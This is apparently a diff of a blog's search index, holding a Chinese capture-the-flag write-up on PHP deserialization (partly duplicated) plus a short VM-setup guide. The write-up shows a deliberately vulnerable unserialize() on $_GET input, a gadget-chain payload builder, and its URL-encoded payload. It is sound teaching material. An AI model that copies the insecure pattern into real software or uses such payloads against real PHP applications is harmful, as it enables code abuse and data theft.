+<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
+<p>以下是漏洞中可能遇到的魔法方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>
+
+<p><em>例题</em></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过：</strong></p>
+<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
+      <tags>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机的搭建</title>
+    <url>/2024/08/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p>虚拟机搭建<br>  1.首先安装vmware（<a href="https://support.broadcom.com/group/ecx/downloads%EF%BC%89%EF%BC%88%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89%E9%80%89%E6%8B%A9VMware">https://support.broadcom.com/group/ecx/downloads）（要注册）选择VMware</a> workstation pro 17下载<br>  2.再下载Ubuntu22.04（<a href="https://cn.ubuntu.com/download%EF%BC%89">https://cn.ubuntu.com/download）</a><br>  3.在VMware中搭建虚拟机参考（<a href="https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>  4.进入虚拟机完成Ubuntu的安装。</p>
+]]></content>
   </entry>
   <entry>
     <title>笛卡尔积延时注入</title>
@@ -958,43 +1334,5 @@
       <tags>
         <tag>sql注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>攻防世界</title>
-    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
-    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
-<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
-<p>举例：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>PHP反序列化标识符含义：</p>
-<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>
-
-<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
-<p><strong>原理：</strong></p>
-<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
-<p>以下是漏洞中可能遇到的魔法方法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>
-
-<p><em>例题</em></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>构造payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-
-<p><strong>绕过：</strong></p>
-<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
-      <tags>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>虚拟机的搭建</title>
-    <url>/2024/08/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<p>虚拟机搭建<br>  1.首先安装vmware（<a href="https://support.broadcom.com/group/ecx/downloads%EF%BC%89%EF%BC%88%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89%E9%80%89%E6%8B%A9VMware">https://support.broadcom.com/group/ecx/downloads）（要注册）选择VMware</a> workstation pro 17下载<br>  2.再下载Ubuntu22.04（<a href="https://cn.ubuntu.com/download%EF%BC%89">https://cn.ubuntu.com/download）</a><br>  3.在VMware中搭建虚拟机参考（<a href="https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>  4.进入虚拟机完成Ubuntu的安装。</p>
-]]></content>
   </entry>
 </search>
